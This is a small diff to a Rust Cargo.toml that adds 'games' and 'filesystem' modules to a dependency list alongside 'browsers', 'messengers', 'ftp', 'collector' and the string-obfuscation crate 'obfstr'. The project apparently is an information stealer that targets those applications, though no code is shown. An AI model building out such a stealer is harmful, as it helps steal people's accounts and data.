@@ -19,6 +19,8 @@ miniz_oxide = { version = "0.8.8", default-features = false, features = ["with-a
 ftp = { path = "ftp" }
 messengers = { path = "messengers" }
 browsers = { path = "browsers" }
+games = { path = "games" }
 obfstr = "0.4.4"
 ipinfo = { path = "../ipinfo" }
 collector = { path = "../collector" }
+filesystem = { path = "../filesystem" }
